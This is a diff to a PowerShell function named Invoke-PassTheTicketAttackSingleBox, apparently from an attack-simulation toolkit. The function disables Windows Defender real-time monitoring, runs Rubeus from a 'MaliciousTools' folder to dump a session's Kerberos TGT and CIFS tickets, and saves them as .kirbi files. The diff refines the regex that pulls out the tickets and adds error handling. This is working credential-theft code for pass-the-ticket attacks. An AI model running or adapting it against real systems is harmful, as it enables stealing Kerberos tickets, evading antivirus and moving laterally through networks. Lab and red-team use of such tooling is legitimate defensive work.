@@ -201,15 +201,19 @@ function Invoke-PassTheTicketAttackSingleBox {
         $boxTickets = Join-Path -Path $env:PUBLIC -ChildPath 'AS2Go\Temp\tickets'
         $boxRubeus = Join-Path -Path $env:PUBLIC -ChildPath 'AS2Go\MaliciousTools\Rubeus.exe'
         Set-MpPreference -DisableRealtimeMonitoring $true
+        # dump output also contains a "Base64(key)" field ahead of "Base64EncodedTicket" that is
+        # itself 100+ base64 characters long, so the extraction below must anchor on the
+        # "Base64EncodedTicket" label rather than matching the first long base64 run in the text.
+        $ticketPattern = '(?s)Base64EncodedTicket\s*:\s*\r?\n\r?\n\s*([A-Za-z0-9+/=]{100,})'
         Try {
             Get-Item $boxRubeus -ErrorAction Stop | Out-Null
             # dump prints Base64 only; /outfile is not a valid dump switch, so each
             # ticket type is dumped with /nowrap and decoded into a .kirbi file here.
-            $tgtBase64 = (& $boxRubeus dump /luid:$luid /service:krbtgt /nowrap | Out-String)
-            $cifsBase64 = (& $boxRubeus dump /luid:$luid /service:cifs /nowrap | Out-String)
+            $tgtBase64 = (& $boxRubeus dump /luid:$luid /service:krbtgt /nowrap 2>&1 | Out-String)
+            $cifsBase64 = (& $boxRubeus dump /luid:$luid /service:cifs /nowrap 2>&1 | Out-String)
 
-            $tgtBlob = [regex]::Match($tgtBase64, '[A-Za-z0-9+/=]{100,}').Value
-            $cifsBlob = [regex]::Match($cifsBase64, '[A-Za-z0-9+/=]{100,}').Value
+            $tgtBlob = [regex]::Match($tgtBase64, $ticketPattern).Groups[1].Value
+            $cifsBlob = [regex]::Match($cifsBase64, $ticketPattern).Groups[1].Value
 
             If ($tgtBlob) {
                 [IO.File]::WriteAllBytes("$boxTickets\$user-tgt.kirbi", [Convert]::FromBase64String($tgtBlob))
@@ -221,6 +225,9 @@ function Invoke-PassTheTicketAttackSingleBox {
             # short status lines for the console, the blobs stay on the box
             "TGT saved: $(If ($tgtBlob) { "$user-tgt.kirbi" } else { 'no ticket found' })"
             "Service saved: $(If ($cifsBlob) { "$user-cifs.kirbi" } else { 'no ticket found' })"
+        }
+        Catch {
+            "Failed to decode or write a dumped ticket for candidate '$user': $_"
         }
         Finally {
             Set-MpPreference -DisableRealtimeMonitoring $false
